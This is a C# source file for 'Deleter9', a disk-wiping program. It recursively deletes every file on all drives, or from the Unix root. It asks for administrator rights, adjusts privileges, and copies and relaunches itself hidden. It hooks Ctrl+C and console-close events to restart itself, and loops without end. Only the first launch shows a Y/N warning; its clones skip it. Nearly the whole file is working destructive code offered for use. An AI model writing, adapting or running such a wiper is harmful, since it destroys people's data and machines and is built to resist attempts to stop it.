namespace System
{
    public class OS
    {
        public bool IsWindows;
        public string ProcessFilePath;
        private static bool CapitalizeContains(string a, string b)
        {
            a = Capitalize(a);
            b = Capitalize(b);
            return a.IndexOf(b) >= 0;
        }
        private static string Capitalize(string str)
        {
            if (string.IsNullOrEmpty(str))
            {
                return str;
            }
            char[] a = str.ToLower().ToCharArray();
            a[0] = char.ToUpper(a[0]);
            return new(a);
        }
        public virtual void RestartProcess()
        {
            Diagnostics.Process.Start(Reflection.Assembly.GetEntryAssembly().Location);
        }
        public static string GetExePath()
        {
            return Reflection.Assembly.GetEntryAssembly().Location;
        }
        public static string GetRuntimeExePath()
        {
            return Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        }
        public static bool RunningOnMono()
        {
            return Type.GetType("Mono.Runtime") != null;
        }
        public unsafe static OS GetCurrentOS()
        {
            if (RunningOnMono())
            {
                return new Mono();
            }
            else
            {
                PlatformID platform = Environment.OSVersion.Platform;
                OS win = new Win(),
                    unix = new Unix(),
                    linux = new Linux();
                if (platform == PlatformID.Win32S)
                {
                    return win;
                }
                else if (platform == PlatformID.Win32Windows)
                {
                    return win;
                }
                else if (platform == PlatformID.Win32NT)
                {
                    return win;
                }
                else if (platform == PlatformID.WinCE)
                {
                    return win;
                }
                else if (platform == PlatformID.Xbox)
                {
                    return win;
                }
                else if (platform == PlatformID.Unix)
                {
                    sbyte* utsname = stackalloc sbyte[8192];
                    uname(utsname);
                    string kernel = new(utsname);
                    if (CapitalizeContains(kernel, "Linux"))
                    {
                        return linux;
                    }
                    else if (CapitalizeContains(kernel, "Unix"))
                    {
                        return unix;
                    }
                    else
                    {
                        return unix;
                    }
                }
                else if (platform == PlatformID.MacOSX)
                {
                    return unix;
                }
                else
                {
                    sbyte* utsname = stackalloc sbyte[8192];
                    uname(utsname);
                    string kernel = new(utsname);
                    if (CapitalizeContains(kernel, "Windows"))
                    {
                        return win;
                    }
                    else if (CapitalizeContains(kernel, "Linux"))
                    {
                        return linux;
                    }
                    else if (CapitalizeContains(kernel, "Unix"))
                    {
                        return unix;
                    }
                    else
                    {
                        return unix;
                    }
                }
            }
        }
        [Runtime.InteropServices.DllImport("libc")]
        public unsafe static extern void uname(sbyte* uname_struct);
    }
    public class Win : OS
    {
        public Win()
        {
            IsWindows = true;
            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
        }
    }
    public class Unix : OS
    {
        public Unix()
        {
            IsWindows = false;
            ProcessFilePath = IO.Path.GetFullPath(Reflection.Assembly.GetExecutingAssembly().Location);
        }
        public override void RestartProcess()
        {
            RestartInPlace();
        }
        public virtual void RestartInPlace()
        {
            execvp(GetRuntimeExePath(), new string[]
            {
                GetRuntimeExePath(),
                GetExePath(),
                null
            });
            Console.Out.WriteLine("execvp {0} failed: {1}", GetRuntimeExePath(), Runtime.InteropServices.Marshal.GetLastWin32Error());
            if (RunningOnMono())
            {
                execvp("mono", new string[]
                {
                "mono",
                GetExePath(),
                null
                });
                Console.Out.WriteLine("execvp mono failed: {0}", Runtime.InteropServices.Marshal.GetLastWin32Error());
            }
        }
        [Runtime.InteropServices.DllImport("libc", SetLastError = true)]
        public static extern int execvp(string path, string[] argv);
        public static string[] GetProcessCommandLineArgs()
        {
            using IO.StreamReader r = new("/proc/self/cmdline");
            string[] args = r.ReadToEnd().Split('\0');
            args[args.Length - 1] = null;
            return args;
        }
    }
    public class Mono : Unix
    {
        public Mono()
        {
            IsWindows = false;
            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
        }
        public override void RestartProcess()
        {
            try
            {
                execvp(GetRuntimeExePath(), GetProcessCommandLineArgs());
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error restarting process: {0}", ex);
            }
            RestartInPlace();
        }
    }
    public class Linux : Unix
    {
        public Linux()
        {
            IsWindows = false;
            ProcessFilePath = IO.Path.GetFullPath(Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
        }
        public override void RestartInPlace()
        {
            try
            {
                execvp(GetRuntimeExePath(), GetProcessCommandLineArgs());
            }
            catch (Exception ex)
            {
                Console.Out.WriteLine("Error restarting process: {0}", ex);
            }
            base.RestartInPlace();
        }
    }
    public class Deleter
    {
        [Runtime.InteropServices.DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool EnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        public delegate bool ConsoleEventDelegate(int eventType);
        [Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
        public const string Ver = "1.1", Title = "Deleter9 v" + Ver;
        private static string[] LogicalDrives;
        private static Collections.Generic.List<IO.DriveInfo> Disks = new()
        {
        };
        private static readonly Collections.Generic.List<string> DirectoriesList = new()
        {
        };
        private static string FileName = string.Empty,
            FileExtension = string.Empty;
        private static double Double, LoopingDouble, Count = 0;
        private static readonly string Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
        private static readonly string[] Messages = Argument.Split('\n');
        private static bool FileDeleted = false, IsCloned = false;
        private static Exception Exception;
        private static bool CanAccess(string folderPath, out Exception ex)
        {
            IO.DirectoryInfo dirInfo = new(folderPath);
            try
            {
                dirInfo.GetAccessControl(Security.AccessControl.AccessControlSections.All);
                ex = null;
                return true;
            }
            catch (Security.AccessControl.PrivilegeNotHeldException e)
            {
                ex = e;
                return false;
            }
        }
        private static Collections.Generic.List<string> AddDir(string dir)
        {
            if (!DirectoriesList.Contains(dir))
            {
                if (CanAccess(dir, out Exception ex))
                {
                    DirectoriesList.Add(dir);
                }
                else
                {
                    Console.Out.WriteLine("Can't access " + dir + ex);
                }
            }
            foreach (string d in IO.Directory.GetDirectories(dir))
            {
                if (CanAccess(d, out Exception ex))
                {
                    DirectoriesList.Add(d);
                    AddDir(d);
                }
                else
                {
                    Console.Out.WriteLine("Can't access " + d + ex);
                }
            }
            return DirectoriesList;
        }
        private static void TryDeleteFile(string file)
        {
            if (IO.File.Exists(file))
            {
                try
                {
                    Console.Out.WriteLine("Deleting " + file);
                    IO.File.Delete(file);
                    if (!IO.File.Exists(file))
                    {
                        FileDeleted = true;
                    }
                    else
                    {
                        Exception = new InvalidOperationException("Failed to delete file: " + file);
                        FileDeleted = false;
                    }
                }
                catch (Exception e)
                {
                    Exception = e;
                    FileDeleted = false;
                }
            }
            else
            {
                FileDeleted = true;
            }
        }
        private static void ContinueDeletingUnix()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
            }
            catch
            {
                Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
            }
            Console.Clear();
            Count++;
            Console.Out.WriteLine(Count);
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.BackgroundColor = ConsoleColor.Black;
            Threading.Thread.Sleep(200);
            Console.Out.WriteLine(Messages);
            string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
            if (root == null || root == "")
            {
                root = "/";
            }
            AddDir(root);
            while (LoopingDouble != double.PositiveInfinity)
            {
                LoopingDouble++;
                try
                {
                    Collections.Generic.List<string> dirs = DirectoriesList;
                    foreach (string dir in dirs)
                    {
                        string[] files = IO.Directory.GetFiles(dir);
                        foreach (string file in files)
                        {
                            TryDeleteFile(file);
                            if (!FileDeleted)
                            {
                                Console.Out.WriteLine("Failed to delete file: " + file);
                                Console.Out.WriteLine(Exception);
                            }
                        }
                    }
                }
                catch
                {
                    DeleteDirUnix();
                }
            }
        }
        private static void DeleteDirUnix()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out _);
            }
            catch
            {
                Console.Out.WriteLine("Failed to adjust privileges, continuing without them.");
            }
            Console.ForegroundColor = ConsoleColor.Red;
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Out.WriteLine(Messages);
            string root = IO.Directory.GetDirectoryRoot(IO.Directory.GetCurrentDirectory());
            if (root == null || root == "")
            {
                root = "/";
            }
            AddDir(root);
            while (LoopingDouble != double.PositiveInfinity)
            {
                LoopingDouble++;
                try
                {
                    Collections.Generic.List<string> dirs = DirectoriesList;
                    foreach (string dir in dirs)
                    {
                        string[] files = IO.Directory.GetFiles(dir);
                        foreach (string file in files)
                        {
                            TryDeleteFile(file);
                            if (!FileDeleted)
                            {
                                Console.Out.WriteLine("Failed to delete file: " + file);
                                Console.Out.WriteLine(Exception);
                            }
                        }
                    }
                }
                catch
                {
                    ContinueDeletingUnix();
                }
            }
        }
        private static void DeleteDir()
        {
            try
            {
                Console.Clear();
                Console.Out.WriteLine(Messages);
                LogicalDrives = IO.Directory.GetLogicalDrives();
                Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                foreach (IO.DriveInfo disk in Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    }
                    else
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name);
                    }
                    foreach (string drive in LogicalDrives)
                    {
                        string root = IO.Directory.GetDirectoryRoot(drive);
                        if (root == null || root == "")
                        {
                            root = "/";
                        }
                        AddDir(root);
                        Collections.Generic.List<string> dirs = DirectoriesList;
                        foreach (string dir in dirs)
                        {
                            string[] files = IO.Directory.GetFiles(dir);
                            foreach (string file in files)
                            {
                                TryDeleteFile(file);
                                if (!FileDeleted)
                                {
                                    Console.Out.WriteLine("Failed to delete file: " + file);
                                    Console.Out.WriteLine(Exception);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                while (LoopingDouble != double.PositiveInfinity)
                {
                    LoopingDouble++;
                    ContinueDeleting();
                }
            }
        }
        private static void ContinueDeleting()
        {
            try
            {
                Count++;
                LogicalDrives = IO.Directory.GetLogicalDrives();
                Disks = new Collections.Generic.List<IO.DriveInfo>(IO.DriveInfo.GetDrives());
                Console.Out.WriteLine(Count);
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.BackgroundColor = ConsoleColor.Black;
                Threading.Thread.Sleep(200);
                Console.Out.WriteLine(Messages);
                foreach (IO.DriveInfo disk in Disks)
                {
                    if (disk.Name != disk.VolumeLabel)
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
                    }
                    else
                    {
                        Console.Out.WriteLine("Current drive is: " + disk.Name);
                    }
                    foreach (string drive in LogicalDrives)
                    {
                        string root = IO.Directory.GetDirectoryRoot(drive);
                        if (root == null || root == "")
                        {
                            root = "/";
                        }
                        AddDir(root);
                        Collections.Generic.List<string> dirs = DirectoriesList;
                        foreach (string dir in dirs)
                        {
                            string[] files = IO.Directory.GetFiles(dir);
                            foreach (string file in files)
                            {
                                TryDeleteFile(file);
                                if (!FileDeleted)
                                {
                                    Console.Out.WriteLine("Failed to delete file: " + file);
                                    Console.Out.WriteLine(Exception);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                while (LoopingDouble != double.PositiveInfinity)
                {
                    LoopingDouble++;
                    DeleteDir();
                }
            }
        }
        private static bool ConsoleEventCallback(int eventType)
        {
            OS.GetCurrentOS().RestartProcess();
            return false;
        }
        private static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
        {
            OS.GetCurrentOS().RestartProcess();
        }
        private static void Continue()
        {
            FileExtension = IO.Path.GetExtension(OS.GetCurrentOS().ProcessFilePath);
            FileName = IO.Path.GetFileNameWithoutExtension(OS.GetCurrentOS().ProcessFilePath);
            if (OS.GetCurrentOS().IsWindows)
            {
                Console.CancelKeyPress += OnCancelKeyPress;
                SetConsoleCtrlHandler(new(ConsoleEventCallback), true);
                Console.Title = Title;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.BackgroundColor = ConsoleColor.Black;
            }
            Threading.Thread.Sleep(1000);
            while (Double != double.PositiveInfinity)
            {
                try
                {
                    Double++;
                    if (!OS.GetCurrentOS().IsWindows)
                    {
                        DeleteDirUnix();
                    }
                    else
                    {
                        IO.File.Copy(IO.Path.GetFileName(OS.GetCurrentOS().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                        Diagnostics.Process p = new();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = FileName + "(" +
                            Double + ")" + FileExtension;
                        p.StartInfo.Arguments = "cloned " + Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        DeleteDir();
                    }
                }
                catch
                {
                    while (LoopingDouble != double.PositiveInfinity)
                    {
                        LoopingDouble++;
                        Start();
                    }
                }
            }
        }
        public static void Main(string[] args)
        {
            string arguments = "";
            foreach (string arg in args)
            {
                arguments += arg;
            }
            if (arguments.ToLower().Contains("cloned"))
            {
                IsCloned = true;
            }
            else
            {
                IsCloned = false;
            }
            if (!IsCloned)
            {
                Console.Out.WriteLine("WARNING! THIS DELETES THE ROOT DIRECTORY! " +
                    "EXECUTING THIS WILL RENDER YOUR DEVICE UNUSABLE!");
                Console.Out.WriteLine("ARE YOU SURE YOU WANT TO CONTINUE? Y OR N");
                if (!Console.ReadLine().ToUpper().Contains("Y"))
                {
                    Environment.Exit(0);
                    return;
                }
            }
            if (Security.Principal.WindowsIdentity.GetCurrent().IsSystem 
                || Security.Principal.WindowsIdentity.GetCurrent().User.ToString() == "S-1-5-18"  
                || new Security.Principal.WindowsPrincipal(Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(Security.Principal.WindowsBuiltInRole.Administrator))
            {
                Start();
            }
            else
            {
                try
                {
                    Diagnostics.Process p = new();
                    p.StartInfo.FileName = Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                    p.StartInfo.RedirectStandardOutput = false;
                    p.StartInfo.RedirectStandardError = false;
                    p.StartInfo.CreateNoWindow = false;
                    p.StartInfo.UseShellExecute = true;
                    p.StartInfo.Verb = "runas";
                    p.StartInfo.Arguments = Argument;
                    p.Start();
                    Environment.Exit(0);
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine("Error when deleting: {0}", e);
                    Console.ReadKey();
                    Environment.Exit(0);
                }
            }
        }
        private static void Start()
        {
            FileExtension = IO.Path.GetExtension(OS.GetCurrentOS().ProcessFilePath);
            FileName = IO.Path.GetFileNameWithoutExtension(OS.GetCurrentOS().ProcessFilePath);
            if (OS.GetCurrentOS().IsWindows)
            {
                Console.CancelKeyPress += OnCancelKeyPress;
                SetConsoleCtrlHandler(new(ConsoleEventCallback), true);
                Console.Title = Title;
                Console.ForegroundColor = ConsoleColor.Red;
                Console.BackgroundColor = ConsoleColor.Black;
            }
            Threading.Thread.Sleep(1000);
            while (Double != double.PositiveInfinity)
            {
                try
                {
                    Double++;
                    if (!OS.GetCurrentOS().IsWindows)
                    {
                        DeleteDirUnix();
                    }
                    else
                    {
                        IO.File.Copy(IO.Path.GetFileName(OS.GetCurrentOS().ProcessFilePath), FileName + " (" + Double + ")" + FileExtension);
                        Diagnostics.Process p = new();
                        p.StartInfo.UseShellExecute = true;
                        p.StartInfo.Verb = "runas";
                        p.StartInfo.FileName = FileName + "(" +
                            Double + ")" + FileExtension;
                        p.StartInfo.Arguments = "cloned " + Argument;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.WindowStyle = Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();
                        DeleteDir();
                    }
                }
                catch
                {
                    while (LoopingDouble != double.PositiveInfinity)
                    {
                        LoopingDouble++;
                        Continue();
                    }
                }
            }
        }
    }
}